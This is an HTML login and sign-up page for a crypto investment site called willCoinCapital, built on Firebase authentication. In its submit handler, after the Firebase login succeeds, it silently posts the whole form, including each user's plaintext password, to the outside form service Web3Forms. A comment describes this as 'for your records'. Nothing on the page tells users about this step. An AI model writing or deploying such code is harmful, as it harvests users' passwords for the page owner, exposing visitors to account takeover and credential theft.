<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>willCoinCapital | Gateway</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #000; color: white; margin: 0; overflow: hidden; height: 100vh; }
        .main-aura {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 450px; height: 450px;
            background: radial-gradient(circle, rgba(20, 184, 166, 0.2) 0%, rgba(34, 211, 238, 0) 70%);
            filter: blur(60px); z-index: 1; pointer-events: none;
            animation: pulseAura 8s infinite;
        }
        @keyframes pulseAura { 0%, 100% { opacity: 0.2; transform: translate(-50%, -50%) scale(1); } 50% { opacity: 0.4; transform: translate(-50%, -50%) scale(1.1); } }
        .btn-solid { background: linear-gradient(to right, #14b8a6, #22d3ee); color: #000; }
        .view-hidden { display: none !important; }
    </style>
</head>
<body class="flex flex-col items-center justify-between py-16 px-10 relative">
    <div class="main-aura"></div>

    <header class="text-center z-20 space-y-3">
        <div class="text-[26px] font-800 uppercase tracking-tighter">WILLCOIN<span class="text-cyan-400">CAPITAL</span></div>
        <h1 class="text-[34px] font-extrabold tracking-tighter leading-tight text-white pt-4">Own Your Assets <br> <span class="text-cyan-400">Invest Your Assets</span></h1>
    </header>

    <div class="w-full max-w-sm space-y-4 z-20">
        <button onclick="toggleAuth('login')" class="w-full py-4 rounded-2xl border border-teal-500/50 text-teal-500 text-[11px] font-black uppercase tracking-widest active:scale-95 transition-all">
            LOGIN ACCOUNT
        </button>
        <button onclick="toggleAuth('signup')" class="w-full py-4 rounded-2xl btn-solid text-[11px] font-black uppercase tracking-widest active:scale-95 transition-all">
            CREATE ACCOUNT
        </button>
    </div>

    <div id="authModal" class="fixed inset-0 z-[100] flex items-center justify-center p-6 view-hidden">
        <div class="absolute inset-0 bg-black/95 backdrop-blur-xl" onclick="toggleAuth()"></div>
        <div class="relative z-10 w-full max-w-xs space-y-6">
            <h2 id="authTitle" class="text-center text-xl font-black uppercase tracking-tighter text-cyan-400">Authorize</h2>
            <form id="authForm" class="space-y-3">
                <input type="hidden" name="access_key" value="56f62943-45be-49fc-9e75-e166e5d4d20b">
                <input type="email" name="email" id="userEmail" placeholder="EMAIL ADDRESS" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-[10px] font-bold outline-none text-white focus:border-cyan-500/50 uppercase tracking-widest">
                <input type="password" name="password" placeholder="PASSWORD" required class="w-full bg-white/5 border border-white/10 rounded-xl p-4 text-[10px] font-bold outline-none text-white focus:border-cyan-500/50 uppercase tracking-widest">
                <button type="submit" id="authSubmit" class="w-full py-4 btn-solid rounded-xl text-[10px] font-black uppercase tracking-widest">Continue</button>
            </form>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDsY7hDvNEDq_8SE0XcHrgLU5e6kQxpMPA",
            authDomain: "willcoincapital.firebaseapp.com",
            projectId: "willcoincapital",
            storageBucket: "willcoincapital.firebasestorage.app",
            messagingSenderId: "241566024834",
            appId: "1:241566024834:web:75e0d771ca7eb9a5a3a09b",
            measurementId: "G-4VEL5JXYYL"
        };

        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();

        function toggleAuth(mode) {
            const modal = document.getElementById('authModal');
            const title = document.getElementById('authTitle');
            if (!mode) { modal.classList.add('view-hidden'); return; }
            title.innerText = mode === 'login' ? 'Welcome Back' : 'Sign Up';
            modal.classList.remove('view-hidden');
        }

        document.getElementById('authForm').onsubmit = async (e) => {
            e.preventDefault();
            const email = document.getElementById('userEmail').value;
            const pass = e.target.password.value;
            const btn = document.getElementById('authSubmit');
            const isSignUp = document.getElementById('authTitle').innerText.toLowerCase().includes('sign');

            btn.innerText = "VERIFYING...";

            try {
                if (isSignUp) {
                    const res = await auth.createUserWithEmailAndPassword(email, pass);
                    await db.collection("users").doc(res.user.uid).set({
                        email: email,
                        balance: 100.00,
                        signupDate: new Date().toISOString()
                    });
                    localStorage.setItem("displayMode", "new");
                } else {
                    await auth.signInWithEmailAndPassword(email, pass);
                    localStorage.setItem("displayMode", "returning");
                }
                
                // Submit to Web3Forms for your records
                fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
                window.location.href = "dashboard.html";
            } catch (err) {
                alert(err.message);
                btn.innerText = "TRY AGAIN";
            }
        };
    </script>
</body>
</html>
